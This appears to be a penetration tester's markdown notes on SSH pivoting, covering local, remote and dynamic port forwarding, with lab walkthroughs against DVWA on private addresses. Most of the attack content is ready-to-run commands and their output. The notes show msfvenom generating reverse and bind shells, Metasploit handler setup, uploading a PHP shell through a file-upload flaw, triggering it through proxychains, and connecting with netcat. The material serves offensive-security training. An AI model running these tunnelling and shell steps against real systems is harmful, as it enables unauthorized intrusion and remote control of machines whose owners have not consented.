# SSH

## 01 - Unix Shell

### 1.1 - Local Port Forwarding

#### 1.1.1 - Usage

```
$ cat /etc/ssh/sshd_config
..[snip]..
AllowTcpForwarding yes
..[snip]..
```

**Syntax:**

`$ ssh -NTfCq -L <bind_address>:<local_port>:<remote_ip>:<bind_port> <username>@<IP>`

#### 1.1.2 - Scenarios

##### 1.1.2.1 - Reverse Shell Callback Tunnel

TODO: Make a network topology diagram to illustrate the pivoting scenario

### 1.2 - Remote Port Forwarding

#### 1.2.1 - Usage

```
$ cat /etc/ssh/sshd_config
..[snip]..
GatewayPorts yes
..[snip]..
```

- Victim port forwarding to the attacker's SSH server

`$ ssh -NTfCq -R <bind_address>:<local_port>:<remote_ip>:<bind_port> <username>@<attacker_IP>`

- Remote Port forwarding reverse shells SSH C2 Server as a WAN

`$ ssh -NTfCq -R <local_port>:127.0.0.1:<bind_port> <username>@<IP>`

- Generate a reverse callback shell and start a shell handler via `netcat`

```
$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<SSH_IP> lport=<local_port> -f elf -o shell.elf

$ nc -lnvp <bind_port>
```

- Generate a reverse callback shell and start a shell handler via `metasploit`

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<SSH_IP> lport=<local_port> -f elf -o shell.elf

msf > use payload/linux/x86/meterpreter/reverse_tcp

msf payload(linux/x86/meterpreter/reverse_tcp) > set lhost <SSH_IP>

msf payload(linux/x86/meterpreter/reverse_tcp) > set lport <bind_port>

msf payload(linux/x86/meterpreter/reverse_tcp) > to_handler
```

#### 1.2.2 - Scenarios

##### 1.2.2.1 - Reverse Tunneling

```
$ ssh fox@10.0.2.15

fox@ubuntulinux:~$ ssh -NTfCq -R 8888:192.168.56.106:80 -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" user@10.0.2.4
```

![[01 - Reverse Port Forwarding.png]]

```
$ ss -antp
State          Recv-Q         Send-Q                 Local Address:Port                    Peer Address:Port          Process
LISTEN         0              128                          0.0.0.0:22                           0.0.0.0:*
LISTEN         0              128                          0.0.0.0:8888                         0.0.0.0:*
ESTAB          0              0                           10.0.2.4:42586                      10.0.2.15:22             users:(("ssh",pid=5282,fd=3))
ESTAB          0              0                           10.0.2.4:22                         10.0.2.15:44498
LISTEN         0              128                             [::]:22                              [::]:*
LISTEN         0              128                             [::]:8888                            [::]:*
```

##### 1.2.2.2 - Reverse Shell Tunnel

TODO: Make a network topology diagram to illustrate the pivoting scenario

`$ ssh fox@10.0.2.15 -NTfCq -D1080 -R 192.168.56.111:4455:127.0.0.1:4445`

![[01 - Reverse Shell Tunnel.png]]

`$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.111 lport=4455 -f raw -o rsh.php`

Launch a shell handler in metasploit for incoming sessions.

```
msf6 > use exploit/mutli/handler
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set lhost 192.168.56.111
lhost => 192.168.56.111
msf6 > exploit(multi/handler) > set lport 4445
lport => 4445
msf6 > exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[-] Handler failed to bind to 192.168.56.111:4445:-  -
[*] Started reverse TCP handler on 0.0.0.0:4445
```

Upload the reverse shell.

![[02 - PHP File Upload.png]]

Edit the Proxychains configuration.

```
$ cat /etc/proxychains4.conf
..[snip]..
socks5  127.0.0.1 1080
```

Then execute the reverse shell.

```
$ proxychains curl -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.106:80  ...  OK

$ curl --socks5 127.0.0.1:1080 -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
```

We have established a meterpreter reverse shell.

![[03 - MSF Reverse Callback Shell.png]]

### 1.3 - Dynamic Port Forwarding

#### 1.3.1 - Usage

```
$ cat /etc/ssh/sshd_config
..[snip]..
AllowTcpForwarding yes
..[snip]..
```

`$ ssh <username>@<pivot_IP> -D1080`

- Method 1: `proxychains`

```
$ cat /etc/proxychains4.conf
..[snip]..
socks4  127.0.0.1 1080

$ proxychains firefox <target_IP>
```

- Method 2: FoxyProxy

You can use a **FoxyProxy** firefox extension to create a pattern

![[01 - New SOCKS Proxy Configuration.png]]

Then select **SOCKS4 Proxy** that you've created.

![[02 - FoxyProxy Select SOCKS Proxy Pattern.png]]

- Method 3: Firefox's Network Settings

You can go to Firefox's **Network Settings**

![[03 - Firefox Network Settings.png]]

Then edit the **SOCKS Host**

![[04 - Firefox Manual Proxy Configuration.png]]

#### 1.3.2 - Scenarios

##### 1.3.2.1 - Bind Shell via Proxychains

TODO: Make a network topology diagram to illustrate the pivoting scenario

Let's say we were able to compromise the machine and got the SSH credentials and finally establish the SSH server as a foothold to start a socks proxy dynamic port forwarding 1080

`$ ssh -NTfCq -D1080 vagrant@10.0.2.10`

![[01 - Linux Machine Pivoting.png]]

Then we configure the SOCKS4/SOCKS5 through **FoxyProxy** firefox extension with the following settings

![[02 - FoxyProxy SOCKS Proxy Configuration.png]]

Then we choose the **SOCKS4 Proxy** to make connection to the webserver

![[03 - Select FoxyProxy Pattern.png]]

We will use the **DVWA (Damn Vulnerable Web Application)** as an example to simulate the cyber attack of the file upload vulnerability

![[04 - DVWA File Upload Webpage.png]]

We generate a PHP bind shell then we upload it.

`$ msfvenom -p php/bind_php lport=8888 -f raw -o shell.php`

![[05 - Callback Shell Uploaded.png]]

Then we must activate the PHP bind shell to start a listener of port **8888** and there are two ways to do it:

- Method 1: Navigate through the URL with FoxyProxy

Using any web browser like firefox to navigate the path of the URL.

![[06 - Navigate URL FoxyProxy.png]]

- Method 2: Proxychains with cURL

Using the `curl` command with `proxychains` to execute the webserver while pivoting.

`$ proxychains curl -X GET http://192.168.56.106/dvwa/hackable/uploads/shell.php`

It starts a listening port of **8888** that is awaiting for connection from the compromised webserver

```
$ ss -lnt
State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process
LISTEN       0            128                      0.0.0.0:8888                    0.0.0.0:*
LISTEN       0            511                            *:80                            *:*
```

Establishing the bind shell to execute further commands by entering the IP address and the Port that we've generated the bind shell.

`$ proxychains nc 192.168.56.106 8888`

![[07 - Callback Shell via Proxychains.png]]

This can be applied with webshells like [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Callback Shells/Webshells/Webshells#^e8491c|weevely]] as well.

## 02 - Metasploit

TODO: Demonstrate pivoting via `ssh_login` MSF module (see references)

---
## References

- [FareedFauzi OSCP Playbook Port Forwarding SSH Tunneling]([https://fareedfauzi.gitbook.io/oscp-notes/others/port-forwarding-ssh-tunneling](https://fareedfauzi.gitbook.io/oscp-notes/others/port-forwarding-ssh-tunneling))

- [Cocomelonc Pivoting Part 1](https://cocomelonc.github.io/pentest/2021/11/04/pivoting-1.html)

- [LinuxHint SSH StrickHostKeyChecking](https://linuxhint.com/ssh-stricthostkeychecking/)

- [Forwarding Reverse Shells Through A Jump Box Using SSH](https://ryanwendel.medium.com/forwarding-reverse-shells-through-a-jump-box-using-ssh-7111f1d55e3a)

- [Network Pivoting Using SSH Return Reverse Shell From Internal Network Machine](https://bryanleong98.medium.com/network-pivoting-using-ssh-return-reverse-shell-from-internal-network-machine-f1c5043b2d86)

- [Using SSH Socks Proxies with MSF Reverse TCP Payloads](https://bechtsoudis.com/archive/2012/06/08/using-ssh-socks-proxies-with-msf-reverse-tcp-payloads/index.html)

- [Certcube: Pivoting and SSH Port Forwarding Basics](https://blog.certcube.com/pivoting-port-forwarding/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

- [Pivoting Through Tomcat](http://willgenovese.com/pivoting-through-tomcat/)

- [SkyDogCon 2017: "SSH+MSF+TOR = Anonymous Remote Shells" by Catatonic Prime](https://www.youtube.com/watch?v=RvZ9-hD-KZw)

- [Rapid7 Metasploit Framework Auxiliary Scanner SSH Login](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login.md)

- [Ironhackers Port Forwarding Cheatsheet](https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/)

- [PayloadsAllTheThings Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

- [Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

- [SlayerLabs Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)